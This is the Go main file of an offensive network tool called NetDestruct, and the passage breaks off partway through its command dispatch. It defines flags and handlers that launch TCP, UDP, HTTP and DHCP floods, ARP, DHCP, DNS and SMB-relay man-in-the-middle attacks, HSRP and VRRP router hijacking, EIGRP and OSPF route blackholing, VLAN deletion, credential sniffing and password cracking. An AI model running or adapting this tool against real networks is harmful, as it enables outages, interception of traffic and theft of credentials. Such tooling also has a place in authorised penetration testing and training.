package main

import (
	"errors"
	"fmt"
	"os"
	"strings"
	"sync"

	bfdcrack "netdestruct/libs/authentication-cracking/bfd"
	eigrpcrack "netdestruct/libs/authentication-cracking/eigrp"
	glbpcrack "netdestruct/libs/authentication-cracking/glbp"
	hsrpcrack "netdestruct/libs/authentication-cracking/hsrp"
	isiscrack "netdestruct/libs/authentication-cracking/isis"
	ntpcrack "netdestruct/libs/authentication-cracking/ntp"
	ospfcrack "netdestruct/libs/authentication-cracking/ospf"
	rsvpcrack "netdestruct/libs/authentication-cracking/rsvp"
	sshcrack "netdestruct/libs/authentication-cracking/ssh"
	tacacscrack "netdestruct/libs/authentication-cracking/tacacs"
	vrrpcrack "netdestruct/libs/authentication-cracking/vrrp"
	vtpcrack "netdestruct/libs/authentication-cracking/vtp"
	ciscopass "netdestruct/libs/cisco-passwords"
	arpdos "netdestruct/libs/dos/arp"
	"netdestruct/libs/dos/cdpflood"
	"netdestruct/libs/dos/dhcpflood"
	eigrpdos "netdestruct/libs/dos/eigrp"
	"netdestruct/libs/dos/httpflood"
	"netdestruct/libs/dos/icmpflood"
	"netdestruct/libs/dos/macflood"
	"netdestruct/libs/dos/stpflood"
	ospfdos "netdestruct/libs/dos/ospf"
	"netdestruct/libs/dos/tcpflood"
	"netdestruct/libs/dos/udpflood"
	vtpdelete "netdestruct/libs/dos/vtpdelete"
	vtpcrash "netdestruct/libs/dos/vtpcrash"
	"netdestruct/libs/vlan-tampering/vtpadd"
	ftpenum "netdestruct/libs/enumeration/ftp"
	smbenum "netdestruct/libs/enumeration/smb"
	sshenum "netdestruct/libs/enumeration/ssh"
	telnetenum "netdestruct/libs/enumeration/telnet"
	mcget "netdestruct/libs/enumeration/memcached"
	snmpenum "netdestruct/libs/enumeration/snmp"
	snmpdata "netdestruct/libs/data-manipulation/snmp"
	snmpexfil "netdestruct/libs/exfiltration/snmp"
	tftpenum "netdestruct/libs/enumeration/tftp"
	mcdata "netdestruct/libs/data-manipulation/memcached"
	mcdos "netdestruct/libs/dos/memcached"
	"netdestruct/libs/intelligence-gathering/arpscan"
	"netdestruct/libs/intelligence-gathering/cdpenum"
	"netdestruct/libs/intelligence-gathering/dhcpenum"
	"netdestruct/libs/intelligence-gathering/dot1qenum"
	"netdestruct/libs/intelligence-gathering/memcachedenum"
	"netdestruct/libs/intelligence-gathering/smbvers"
	"netdestruct/libs/intelligence-gathering/dot1xenum"
	"netdestruct/libs/intelligence-gathering/dtpenum"
	"netdestruct/libs/mitm/arp"
	"netdestruct/libs/mitm/credsniff"
	"netdestruct/libs/mitm/dhcp"
	"netdestruct/libs/mitm/dhcpv6"
	"netdestruct/libs/mitm/dns"
	dot1xmitm "netdestruct/libs/mitm/dot1xmitm"
	dot1qpoison "netdestruct/libs/mitm/dot1qpoison"
	hsrpmitm "netdestruct/libs/mitm/hsrp"
	"netdestruct/libs/mitm/icmpredirect"
	"netdestruct/libs/mitm/llmnr"
	"netdestruct/libs/mitm/mdns"
	"netdestruct/libs/mitm/nbns"
	"netdestruct/libs/mitm/smb"
	"netdestruct/libs/mitm/smbrelay"
	"netdestruct/libs/mitm/stp"
	vrrpmitm "netdestruct/libs/mitm/vrrp"
	"netdestruct/libs/vlan-bypassing/cdpinject"
	"netdestruct/libs/vlan-bypassing/dot1qdouble"
	"netdestruct/libs/vlan-bypassing/dtpinject"

	"netdestruct/libs/cli"
)

type Flags struct {
	// Shared
	iface        string
	ip           string
	port         string
	floodCount   int
	floodRate    int
	randomSource bool

	// MitM — Name Resolution Poisoning
	doLLMNR bool
	doNBTNS bool
	doMDNS  bool

	// MitM — ARP Poisoning
	doARP     bool
	doScan    bool
	doPoison  bool
	doARPCage bool
	arpSubnet string

	// MitM — DHCP
	doDHCPSpoofing   bool
	doDHCPv6Spoofing bool
	doDHCPRogue      bool

	// MitM — STP
	doSTP         bool
	doRSTP        bool
	doSTPFloodConf bool
	doSTPFloodTCN  bool
	stpMAC        string
	doHijack bool

	// MitM — ICMP
	doICMPMitM     bool
	doICMPRedirect bool

	// MitM — DNS
	doDNSMitM      bool
	dnsSpoofDomain string

	// MitM — SMB Relay
	doSMBRelay bool
	relayFrom  string
	relayTo    string

	// MitM — Credential Sniffing
	doCredSniff bool
	ignoreIP    string
	pcapFile    string
	pcapDir     string
	outputDir   string

	// DoS — Layer 2
	doMACFlood       bool
	doCDPFlood       bool
	doDeleteAllVlans  bool
	doDeleteVlan      bool
	doAddVlan         bool
	doDos             bool
	doCatalystZeroDay bool
	vtpRevision       int
	vlanName         string
	cdpRate          int
	doDHCPFlood     bool
	doDHCPDiscover  bool
	doDHCPRelease   bool
	dhcpPool        string
	dhcpRate    int

	// DoS — ICMP
	doICMPFlood bool

	// DoS — TCP
	doTCPSyn        bool
	doTCPAck        bool
	doTCPRst        bool
	doTCPPsh        bool
	doTCPZeroWin    bool
	doTCPNull       bool
	doTCPOutOfOrder bool
	doTCPXmas       bool
	doTCPFin        bool

	// DoS — UDP
	doUDPNormal    bool
	doUDPZeroLen   bool
	doUDPRandCksum bool
	doUDPZeroCksum bool

	// DoS — HTTP
	doHTTP10DOS bool
	doHTTP11DOS bool
	doHTTP2DOS  bool
	doHTTP3DOS  bool

	// DoS — Routing
	asNumber              int
	srcIP                 string
	doEIGRPBlackhole      bool
	doEIGRPTableOverflow  bool
	doEIGRPFakeNeighbors  bool
	doEIGRPResetNeighbors bool

	// Intelligence Gathering
	doARPScan     bool
	doActive      bool
	doPassive     bool
	doCDP         bool
	doDTP         bool
	doDHCPEnum    bool
	doSMB         bool
	doSMBVersion  bool
	doSMBBrute    bool
	doTelnet      bool
	doMemcached       bool
	doMemcachedFlush  bool
	memcachedSet      string
	memcachedDelete   string
	memcachedValue    string
	doDot1Q           bool
	doDot1X           bool
	doMitm            bool
	enumVal           string // set by --enum; NoOptDefVal enables bare --enum
	doInject          bool
	doEnableTrunk bool
	doDoubleTag   bool
	doArpPoison   bool
	arpRange      string
	srcMAC        string
	eapInfo       string
	icmpPayload   string
	srcVLAN       int
	dstVLAN       int
	dot1qDstIP    string
	dot1qSrcIP    string
	iface1        string
	iface2        string

	// Authentication Cracking
	captureFile          string
	doOSPFAnalysis       bool
	doHSRPAnalysis       bool
	doHSRPv2             bool
	doEIGRPAnalysis      bool
	doVRRPAnalysis       bool
	fhGroup              int
	virtualIP            string
	fhAuth               string
	doGLBPAnalysis       bool
	doNTPAnalysis        bool
	doBFDAnalysis        bool
	doVTPAnalysis        bool
	doRSVPAnalysis       bool
	doISISAnalysis       bool
	doTACACSplusAnalysis bool
	doCrack              bool
	wordlist             string

	// Cisco Passwords
	doCiscoPass   bool
	ciscoPassFile string
	hashValue     string
	doType4       bool
	doType5       bool
	doType7       bool
	doType8       bool
	doType9       bool

	// Enumeration
	tftpServer  string
	getFiles    string
	putFiles    string
	ftpServer   string
	ftpBounce   string
	ftpAnon     bool
	ftpFeatures bool
	userList    string
	passList    string
	smbUser     string
	smbPass     string
	doSSH            bool
	doSSHAuthMethods bool
	doSSHCipherEnum  bool
	doSSHKeyEnum     bool
	sshThreads       int
	doSNMP           bool
	doSNMPWalk    bool
	doConfigDump  bool
	snmpV1        bool
	snmpV2c       bool
	snmpV3        bool
	snmpCommunity string
	snmpOID       string
	snmpTarget    string
	snmpRateMS    int
	snmpTFTPServer string
	snmpAuthPass   string
	snmpPrivProto  string
	snmpPrivPass   string
}

var flagGroups = map[string]string{
	"interface":     "Shared",
	"ip":            "Shared",
	"port":          "Shared",
	"flood-count":   "Shared",
	"flood-rate":    "Shared",
	"random-source": "Shared",

	"llmnr":  "MitM — Name Resolution",
	"nbt-ns": "MitM — Name Resolution",
	"mdns":   "MitM — Name Resolution",

	"arp":    "MitM — ARP Poisoning",
	"scan":   "MitM — ARP Poisoning",
	"poison": "MitM — ARP Poisoning",
	"cage":   "DoS — Layer 2",
	"subnet": "DoS — Layer 2",

	"dhcp-spoofing":   "MitM — DHCP",
	"dhcpv6-spoofing": "MitM — DHCP",
	"rouge":           "MitM — DHCP",

	"stp":        "MitM — STP",
	"rstp":       "MitM — STP",
	"flood-conf": "DoS — Layer 2",
	"flood-tcn":  "DoS — Layer 2",
	"mac":        "MitM — STP",
	"hijack": "MitM — Hijacking",

	"icmp":     "MitM — ICMP",
	"redirect": "MitM — ICMP",

	"dns":          "MitM — DNS",
	"spoof-domain": "MitM — DNS",

	"mitm":       "MitM — 802.1X",
	"interface1": "MitM — 802.1X",
	"interface2": "MitM — 802.1X",
	"arp-poison": "MitM — 802.1Q",
	"dst-ip":     "MitM — 802.1Q",
	"src-ip":     "MitM — 802.1Q",

	"smb-relay":  "MitM — SMB Relay",
	"relay-from": "MitM — SMB Relay",
	"relay-to":   "MitM — SMB Relay",

	"cred-sniffing": "MitM — Credential Sniffing",
	"ignore":        "MitM — Credential Sniffing",
	"pcap-file":     "MitM — Credential Sniffing",
	"pcap-dir":      "MitM — Credential Sniffing",
	"output-dir":    "MitM — Credential Sniffing",

	"mac-flood":  "DoS — Layer 2",
	"cdp-flood":  "DoS — Layer 2",
	"cdp-rate":   "DoS — Layer 2",
	"delete-all-vlans":    "DoS — Layer 2",
	"delete-vlan":         "DoS — Layer 2",
	"add-vlan":            "Vlan Tampering",
	"vlan-name":           "Vlan Tampering",
	"dos":                 "DoS — Layer 2",
	"catalyst-zero-day":   "DoS — Layer 2",
	"revision-number":     "DoS — Layer 2",
	"dhcp-flood": "DoS — Layer 2",
	"discover":   "DoS — Layer 2",
	"release":    "DoS — Layer 2",
	"dhcp-pool":  "DoS — Layer 2",
	"dhcp-rate":  "DoS — Layer 2",

	"icmp-flood": "DoS — ICMP",

	"tcp-syn-flood":          "DoS — TCP",
	"tcp-ack-flood":          "DoS — TCP",
	"tcp-rst-flood":          "DoS — TCP",
	"tcp-push-flood":         "DoS — TCP",
	"tcp-zero-window-flood":  "DoS — TCP",
	"tcp-null-flood":         "DoS — TCP",
	"tcp-out-of-order-flood": "DoS — TCP",
	"tcp-xmas-tree-flood":    "DoS — TCP",
	"tcp-fin-flood":          "DoS — TCP",

	"udp-normal-flood":          "DoS — UDP",
	"udp-zero-length-flood":     "DoS — UDP",
	"udp-random-checksum-flood": "DoS — UDP",
	"udp-zero-checksum-flood":   "DoS — UDP",

	"http1.0-dos": "DoS — HTTP",
	"http1.1-dos": "DoS — HTTP",
	"http2-dos":   "DoS — HTTP",
	"http3-dos":   "DoS — HTTP",

	"as":              "DoS — Routing",
	"src":             "DoS — Routing",
	"blackhole":       "DoS — Routing",
	"table-overflow":  "DoS — Routing",
	"fake-neighbors":  "DoS — Routing",
	"reset-neighbors": "DoS — Routing",

	"arp-scan":     "Intelligence Gathering",
	"active":       "Intelligence Gathering",
	"passive":      "Intelligence Gathering",
	"cdp":          "Intelligence Gathering",
	"dhcp":         "Intelligence Gathering",
	"dtp":          "Intelligence Gathering",
	"802.1q":       "Intelligence Gathering",
	"802.1x":       "Intelligence Gathering",
	"enum":         "Intelligence Gathering",
	"inject":       "Vlan Bypassing",
	"enable-trunk": "Vlan Bypassing",
	"double-tag":   "Vlan Bypassing",
	"src-vlan":     "Vlan Bypassing",
	"dst-vlan":     "Vlan Bypassing",
	"src-mac":      "Intelligence Gathering",
	"eapinfo":      "Intelligence Gathering",
	"payload":      "Intelligence Gathering",
	"range":        "Intelligence Gathering",
	"smb":          "Intelligence Gathering",
	"memcached":    "Intelligence Gathering",
	"flush-all":    "DoS — Application",
	"set":          "Data Manipulation",
	"delete":       "Data Manipulation",
	"value":        "Data Manipulation",
	"version":      "Intelligence Gathering",

	"capture":     "Authentication Cracking",
	"ospf":        "Authentication Cracking",
	"hsrp":        "Authentication Cracking",
	"hsrpv2":      "MitM — FHRP",
	"eigrp":       "Authentication Cracking",
	"vrrp":        "Authentication Cracking",
	"group":       "MitM — FHRP",
	"virtual-ip":  "MitM — FHRP",
	"auth":        "MitM — FHRP",
	"glbp":        "Authentication Cracking",
	"ntp":         "Authentication Cracking",
	"bfd":         "Authentication Cracking",
	"vtp":         "Authentication Cracking",
	"rsvp":        "Authentication Cracking",
	"is-is":       "Authentication Cracking",
	"tacacs-plus": "Authentication Cracking",
	"crack":       "Authentication Cracking",
	"wordlist":    "Authentication Cracking",

	"cisco-pass": "Cisco Passwords",
	"file":       "Cisco Passwords",
	"hash":       "Cisco Passwords",
	"type4":      "Cisco Passwords",
	"type5":      "Cisco Passwords",
	"type7":      "Cisco Passwords",
	"type8":      "Cisco Passwords",
	"type9":      "Cisco Passwords",

	"tftp":       "Enumeration",
	"get":        "Enumeration",
	"put":        "Enumeration",
	"ftp":        "Enumeration",
	"bounce":     "Enumeration",
	"snmp":         "Enumeration",
	"walk":         "Enumeration",
	"v1":           "Data Manipulation",
	"v2c":          "Enumeration",
	"v3":           "Enumeration",
	"community":    "Enumeration",
	"oid":          "Enumeration",
	"target":       "Enumeration",
	"rate-limit":   "Enumeration",
	"config-dump":  "Exfiltration",
	"tftp-server":  "Exfiltration",
	"auth-pass":    "Exfiltration",
	"priv":         "Exfiltration",
	"priv-pass":    "Exfiltration",
	"anon":         "Enumeration",
	"features":     "Enumeration",
	"userlist":     "Enumeration",
	"passlist":     "Enumeration",
	"username":     "Enumeration",
	"password":     "Enumeration",
	"brute":        "Enumeration",
	"ssh":          "Enumeration",
	"auth-methods": "Enumeration",
	"cipher-enum":  "Enumeration",
	"key-enum":     "Enumeration",
	"threads":      "Enumeration",
	"telnet":       "Enumeration",
}

func anyFlagSet(f Flags) bool {
	return f.doLLMNR || f.doNBTNS || f.doMDNS ||
		f.doARP || f.doDHCPSpoofing || f.doDHCPv6Spoofing || f.doDHCPRogue || f.doSTP || f.doRSTP || f.doSTPFloodConf || f.doSTPFloodTCN || f.doICMPMitM || f.doDNSMitM ||
		f.doSMBRelay || f.doMACFlood || f.doCDPFlood || f.doDeleteAllVlans || f.doDeleteVlan || f.doAddVlan || f.doCatalystZeroDay || f.doDHCPFlood || f.doDHCPDiscover || f.doDHCPRelease ||
		f.doICMPFlood ||
		f.doTCPSyn || f.doTCPAck || f.doTCPRst || f.doTCPPsh ||
		f.doTCPZeroWin || f.doTCPNull || f.doTCPOutOfOrder || f.doTCPXmas || f.doTCPFin ||
		f.doUDPNormal || f.doUDPZeroLen || f.doUDPRandCksum || f.doUDPZeroCksum ||
		f.doARPScan || f.doCDP || f.doDTP || f.doDHCPEnum || f.doSMB || f.doTelnet || f.doMemcached || f.doMemcachedFlush || f.memcachedSet != "" || f.memcachedDelete != "" || f.doDot1Q || f.doDot1X || f.doMitm || f.doInject || f.doEnableTrunk || f.doDoubleTag || f.doArpPoison || f.doCredSniff ||
		f.doHTTP10DOS || f.doHTTP11DOS || f.doHTTP2DOS || f.doHTTP3DOS ||
		f.doOSPFAnalysis || f.doHSRPAnalysis || f.doHSRPv2 || f.doEIGRPAnalysis || f.doVRRPAnalysis || f.doGLBPAnalysis || f.doNTPAnalysis || f.doBFDAnalysis || f.doVTPAnalysis || f.doRSVPAnalysis || f.doISISAnalysis || f.doTACACSplusAnalysis ||
		f.doCiscoPass || f.ciscoPassFile != "" || f.hashValue != "" ||
		f.tftpServer != "" || f.ftpServer != "" || f.ftpBounce != "" || f.doSNMP || f.doConfigDump || f.doSSH
}

// enumFlagOn is NoOptDefVal for bare --enum (recon/enum without a key argument).
const enumFlagOn = "__on__"

func enumOn(f Flags) bool { return f.enumVal != "" }

func memcachedEnumKey(f Flags, args []string) string {
	if f.enumVal != "" && f.enumVal != enumFlagOn {
		return f.enumVal // --enum=key form
	}
	// With NoOptDefVal, `--enum key` leaves `key` as a positional arg.
	if len(args) > 0 {
		return strings.TrimSpace(args[0])
	}
	return ""
}

func parseMemcachedSet(setFlag, valueFlag string) (key, value string, err error) {
	setFlag = strings.TrimSpace(setFlag)
	if setFlag == "" {
		return "", "", fmt.Errorf("empty --set key")
	}
	valueFlag = valueFlag // may be empty if key=value form used
	if valueFlag == "" {
		if i := strings.IndexByte(setFlag, '='); i > 0 {
			return setFlag[:i], setFlag[i+1:], nil
		}
		return "", "", fmt.Errorf("--memcached --set requires --value <data> (or --set key=value)")
	}
	return setFlag, valueFlag, nil
}

func main() {
	var flags Flags

	var rootCmd = &cli.Command{
		Use:   "NetDestruct",
		Short: "Network reconnaissance/attack toolkit",
		Long:  "NetDestruct — network reconnaissance/attack toolkit",
		Run: func(cmd *cli.Command, args []string) {
			if !anyFlagSet(flags) {
				cmd.Help()
				return
			}

			ifaceName := flags.iface

			// Credential sniffing can run without -I when reading from a pcap file or directory
			if flags.doCredSniff {
				if flags.pcapFile == "" && flags.pcapDir == "" && ifaceName == "" {
					fmt.Fprintln(os.Stderr, "--cred-sniffing requires -I <iface> for live capture, --pcap-file <file>, or --pcap-dir <dir>")
					os.Exit(1)
				}
				sn := &credsniff.Sniffer{
					Interface: ifaceName,
					IgnoreIP:  flags.ignoreIP,
					PcapFile:  flags.pcapFile,
					PcapDir:   flags.pcapDir,
					OutputDir: flags.outputDir,
				}
				if err := sn.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] CRED-SNIFF: %v\n", err)
					os.Exit(1)
				}
				return
			}

			// Authentication cracking runs from a pcap file — no interface needed.
			// Routing blackhole (--ospf / --eigrp with -I) also skips interface gate below.
			{
				n := 0
				if flags.doOSPFAnalysis && flags.captureFile != "" {
					n++
				}
				if flags.doHSRPAnalysis && flags.captureFile != "" {
					n++
				}
				if flags.doHSRPv2 && flags.doHijack {
					n++
				}
				if flags.doEIGRPAnalysis && flags.captureFile != "" {
					n++
				}
				if flags.doVRRPAnalysis && flags.captureFile != "" {
					n++
				}
				if flags.doGLBPAnalysis {
					n++
				}
				if flags.doNTPAnalysis {
					n++
				}
				if flags.doBFDAnalysis {
					n++
				}
				if flags.doVTPAnalysis && flags.captureFile != "" {
					n++
				}
				if flags.doRSVPAnalysis {
					n++
				}
				if flags.doISISAnalysis {
					n++
				}
				if flags.doTACACSplusAnalysis {
					n++
				}
				if n > 1 {
					fmt.Fprintln(os.Stderr, "--ospf, --hsrp, --eigrp, --vrrp, --glbp, --ntp, --bfd, --vtp, --rsvp, --is-is, and --tacacs-plus cannot be combined; choose one protocol per run")
					os.Exit(1)
				}
			}

			if flags.doHijack {
				hijacks := 0
				if flags.doHSRPAnalysis {
					hijacks++
				}
				if flags.doHSRPv2 {
					hijacks++
				}
				if flags.doVRRPAnalysis {
					hijacks++
				}
				if flags.doSTP {
					hijacks++
				}
				if flags.doRSTP {
					hijacks++
				}
				if flags.doDNSMitM {
					hijacks++
				}
				if hijacks != 1 {
					fmt.Fprintln(os.Stderr, "--hijack requires exactly one of --hsrp, --hsrpv2, --vrrp, --stp, --rstp, or --dns")
					os.Exit(1)
				}
			}

			if flags.doOSPFAnalysis && flags.doEIGRPAnalysis && flags.captureFile == "" && ifaceName != "" {
				fmt.Fprintln(os.Stderr, "--ospf and --eigrp blackhole cannot be combined; choose one per run")
				os.Exit(1)
			}

			fhrpInject := 0
			if flags.doHijack && flags.doHSRPAnalysis {
				fhrpInject++
			}
			if flags.doHijack && flags.doHSRPv2 {
				fhrpInject++
			}
			if flags.doHijack && flags.doVRRPAnalysis {
				fhrpInject++
			}
			if fhrpInject > 1 {
				fmt.Fprintln(os.Stderr, "--hsrp, --hsrpv2, and --vrrp hijacking cannot be combined; choose one per run")
				os.Exit(1)
			}

			if flags.doOSPFAnalysis {
				if flags.captureFile != "" {
					c := &ospfcrack.Cracker{
						PcapFile: flags.captureFile,
						Crack:    flags.doCrack,
						Wordlist: flags.wordlist,
					}
					if err := c.Run(); err != nil {
						fmt.Fprintf(os.Stderr, "[!] OSPF: %v\n", err)
						os.Exit(1)
					}
					return
				}
				if ifaceName != "" {
					if flags.srcIP == "" {
						fmt.Fprintln(os.Stderr, "--ospf blackhole requires --src <source-ip>")
						os.Exit(1)
					}
					if flags.snmpTarget == "" {
						fmt.Fprintln(os.Stderr, "--ospf blackhole requires --target <ip|range>")
						os.Exit(1)
					}
					b := &ospfdos.Blackhole{
						Interface: ifaceName,
						SourceIP:  flags.srcIP,
						Target:    flags.snmpTarget,
					}
					if err := b.Run(); err != nil {
						fmt.Fprintf(os.Stderr, "[!] OSPF: %v\n", err)
						os.Exit(1)
					}
					return
				}
				fmt.Fprintln(os.Stderr, "--ospf requires --capture <pcap_file> or -I <iface> for blackhole")
				os.Exit(1)
			}

			if flags.doHSRPAnalysis {
				if flags.captureFile != "" {
					if flags.doHijack {
						fmt.Fprintln(os.Stderr, "--hsrp --capture and --hijack cannot be combined")
						os.Exit(1)
					}
					c := &hsrpcrack.Cracker{
						PcapFile: flags.captureFile,
						Crack:    flags.doCrack,
						Wordlist: flags.wordlist,
					}
					if err := c.Run(); err != nil {
						fmt.Fprintf(os.Stderr, "[!] HSRP: %v\n", err)
						os.Exit(1)
					}
					return
				}
				if flags.doHijack {
					if ifaceName == "" {
						fmt.Fprintln(os.Stderr, "--hsrp --hijack requires -I <iface>")
						os.Exit(1)
					}
					if flags.fhGroup < 0 {
						fmt.Fprintln(os.Stderr, "--hsrp --hijack requires --group <id>")
						os.Exit(1)
					}
					if flags.srcIP == "" {
						fmt.Fprintln(os.Stderr, "--hsrp --hijack requires --src <source-ip>")
						os.Exit(1)
					}
					if flags.virtualIP == "" {
						fmt.Fprintln(os.Stderr, "--hsrp --hijack requires --virtual-ip <vip>")
						os.Exit(1)
					}
					h := &hsrpmitm.Hijacker{
						Interface: ifaceName,
						Group:     flags.fhGroup,
						SourceIP:  flags.srcIP,
						VirtualIP: flags.virtualIP,
						Auth:      flags.fhAuth,
					}
					if err := h.Run(); err != nil {
						fmt.Fprintf(os.Stderr, "[!] HSRP: %v\n", err)
						os.Exit(1)
					}
					return
				}
				fmt.Fprintln(os.Stderr, "--hsrp requires --capture <pcap_file> or --hijack with -I")
				os.Exit(1)
			}

			if flags.doHSRPv2 {
				if !flags.doHijack {
					fmt.Fprintln(os.Stderr, "--hsrpv2 requires --hijack")
					os.Exit(1)
				}
				if ifaceName == "" {
					fmt.Fprintln(os.Stderr, "--hsrpv2 requires -I <iface>")
					os.Exit(1)
				}
				if flags.fhGroup < 0 {
					fmt.Fprintln(os.Stderr, "--hsrpv2 requires --group <id>")
					os.Exit(1)
				}
				if flags.srcIP == "" {
					fmt.Fprintln(os.Stderr, "--hsrpv2 requires --src <source-ip>")
					os.Exit(1)
				}
				if flags.virtualIP == "" {
					fmt.Fprintln(os.Stderr, "--hsrpv2 requires --virtual-ip <vip>")
					os.Exit(1)
				}
				h := &hsrpmitm.Hijacker{
					Interface: ifaceName,
					Group:     flags.fhGroup,
					SourceIP:  flags.srcIP,
					VirtualIP: flags.virtualIP,
					Auth:      flags.fhAuth,
					V2:        true,
				}
				if err := h.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] HSRPv2: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.doEIGRPAnalysis {
				if flags.captureFile != "" {
					c := &eigrpcrack.Cracker{
						PcapFile: flags.captureFile,
						Crack:    flags.doCrack,
						Wordlist: flags.wordlist,
					}
					if err := c.Run(); err != nil {
						fmt.Fprintf(os.Stderr, "[!] EIGRP: %v\n", err)
						os.Exit(1)
					}
					return
				}
				if ifaceName != "" {
					if flags.asNumber == 0 {
						fmt.Fprintln(os.Stderr, "--eigrp requires --as <autonomous-system>")
						os.Exit(1)
					}
					modes := 0
					if flags.doEIGRPBlackhole {
						modes++
					}
					if flags.doEIGRPTableOverflow {
						modes++
					}
					if flags.doEIGRPFakeNeighbors {
						modes++
					}
					if flags.doEIGRPResetNeighbors {
						modes++
					}
					if modes != 1 {
						fmt.Fprintln(os.Stderr, "--eigrp injection requires exactly one of --table-overflow, --blackhole, --fake-neighbors, or --reset-neighbors")
						os.Exit(1)
					}
					if flags.doEIGRPFakeNeighbors {
						if flags.snmpTarget == "" {
							fmt.Fprintln(os.Stderr, "--eigrp --fake-neighbors requires --target <subnet|ip|range>")
							os.Exit(1)
						}
						n := &eigrpdos.FakeNeighbors{
							Interface: ifaceName,
							AS:        uint32(flags.asNumber),
							Target:    flags.snmpTarget,
						}
						if err := n.Run(); err != nil {
							fmt.Fprintf(os.Stderr, "[!] EIGRP: %v\n", err)
							os.Exit(1)
						}
						return
					}
					if flags.doEIGRPResetNeighbors {
						if flags.srcIP == "" {
							fmt.Fprintln(os.Stderr, "--eigrp --reset-neighbors requires --src <source-ip>")
							os.Exit(1)
						}
						if flags.snmpTarget == "" {
							fmt.Fprintln(os.Stderr, "--eigrp --reset-neighbors requires --target <ip|range>")
							os.Exit(1)
						}
						r := &eigrpdos.Reset{
							Interface: ifaceName,
							AS:        uint32(flags.asNumber),
							SourceIP:  flags.srcIP,
							Target:    flags.snmpTarget,
						}
						if err := r.Run(); err != nil {
							fmt.Fprintf(os.Stderr, "[!] EIGRP: %v\n", err)
							os.Exit(1)
						}
						return
					}
					if flags.srcIP == "" {
						fmt.Fprintln(os.Stderr, "--eigrp requires --src <source-ip>")
						os.Exit(1)
					}
					if flags.doEIGRPBlackhole {
						if flags.snmpTarget == "" {
							fmt.Fprintln(os.Stderr, "--eigrp --blackhole requires --target <ip|range>")
							os.Exit(1)
						}
						b := &eigrpdos.Blackhole{
							Interface: ifaceName,
							AS:        uint32(flags.asNumber),
							SourceIP:  flags.srcIP,
							Target:    flags.snmpTarget,
						}
						if err := b.Run(); err != nil {
							fmt.Fprintf(os.Stderr, "[!] EIGRP: %v\n", err)
							os.Exit(1)
						}
						return
					}
					if flags.doEIGRPTableOverflow {
						o := &eigrpdos.Overflow{
							Interface: ifaceName,
							AS:        uint32(flags.asNumber),
							SourceIP:  flags.srcIP,
							Target:    flags.snmpTarget,
						}
						if err := o.Run(); err != nil {
							fmt.Fprintf(os.Stderr, "[!] EIGRP: %v\n", err)
							os.Exit(1)
						}
						return
					}
				}
				fmt.Fprintln(os.Stderr, "--eigrp requires --capture <pcap_file> or -I <iface> with --table-overflow, --blackhole, --fake-neighbors, or --reset-neighbors")
				os.Exit(1)
			}

			if flags.doVRRPAnalysis {
				if flags.captureFile != "" {
					if flags.doHijack {
						fmt.Fprintln(os.Stderr, "--vrrp --capture and --hijack cannot be combined")
						os.Exit(1)
					}
					c := &vrrpcrack.Cracker{
						PcapFile: flags.captureFile,
						Crack:    flags.doCrack,
						Wordlist: flags.wordlist,
					}
					if err := c.Run(); err != nil {
						fmt.Fprintf(os.Stderr, "[!] VRRP: %v\n", err)
						os.Exit(1)
					}
					return
				}
				if flags.doHijack {
					if ifaceName == "" {
						fmt.Fprintln(os.Stderr, "--vrrp --hijack requires -I <iface>")
						os.Exit(1)
					}
					if flags.fhGroup < 0 {
						fmt.Fprintln(os.Stderr, "--vrrp --hijack requires --group <id>")
						os.Exit(1)
					}
					if flags.srcIP == "" {
						fmt.Fprintln(os.Stderr, "--vrrp --hijack requires --src <source-ip>")
						os.Exit(1)
					}
					if flags.virtualIP == "" {
						fmt.Fprintln(os.Stderr, "--vrrp --hijack requires --virtual-ip <vip>")
						os.Exit(1)
					}
					h := &vrrpmitm.Hijacker{
						Interface: ifaceName,
						Group:     flags.fhGroup,
						SourceIP:  flags.srcIP,
						VirtualIP: flags.virtualIP,
						Auth:      flags.fhAuth,
					}
					if err := h.Run(); err != nil {
						fmt.Fprintf(os.Stderr, "[!] VRRP: %v\n", err)
						os.Exit(1)
					}
					return
				}
				fmt.Fprintln(os.Stderr, "--vrrp requires --capture <pcap_file> or --hijack with -I")
				os.Exit(1)
			}

			if flags.doGLBPAnalysis {
				if flags.captureFile == "" {
					fmt.Fprintln(os.Stderr, "--glbp requires --capture <pcap_file>")
					os.Exit(1)
				}
				c := &glbpcrack.Cracker{
					PcapFile: flags.captureFile,
					Crack:    flags.doCrack,
					Wordlist: flags.wordlist,
				}
				if err := c.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] GLBP: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.doNTPAnalysis {
				if flags.captureFile == "" {
					fmt.Fprintln(os.Stderr, "--ntp requires --capture <pcap_file>")
					os.Exit(1)
				}
				c := &ntpcrack.Cracker{
					PcapFile: flags.captureFile,
					Crack:    flags.doCrack,
					Wordlist: flags.wordlist,
				}
				if err := c.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] NTP: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.doBFDAnalysis {
				if flags.captureFile == "" {
					fmt.Fprintln(os.Stderr, "--bfd requires --capture <pcap_file>")
					os.Exit(1)
				}
				c := &bfdcrack.Cracker{
					PcapFile: flags.captureFile,
					Crack:    flags.doCrack,
					Wordlist: flags.wordlist,
				}
				if err := c.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] BFD: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.doVTPAnalysis {
				vtpModes := 0
				if flags.captureFile != "" {
					vtpModes++
				}
				if flags.doDeleteAllVlans {
					vtpModes++
				}
				if flags.doDeleteVlan {
					vtpModes++
				}
				if flags.doAddVlan {
					vtpModes++
				}
				if flags.doCatalystZeroDay {
					vtpModes++
				}
				if vtpModes > 1 {
					fmt.Fprintln(os.Stderr, "--vtp requires exactly one of --capture, --delete-all-vlans, --delete-vlan, --add-vlan, or --catalyst-zero-day")
					os.Exit(1)
				}
				if vtpModes == 0 {
					fmt.Fprintln(os.Stderr, "--vtp requires --capture <pcap_file>, --delete-all-vlans, --delete-vlan, --add-vlan, or --catalyst-zero-day with -I")
					os.Exit(1)
				}
			}
			if flags.doDeleteAllVlans && !flags.doVTPAnalysis {
				fmt.Fprintln(os.Stderr, "--delete-all-vlans requires --vtp")
				os.Exit(1)
			}
			if flags.doDeleteVlan && !flags.doVTPAnalysis {
				fmt.Fprintln(os.Stderr, "--delete-vlan requires --vtp")
				os.Exit(1)
			}
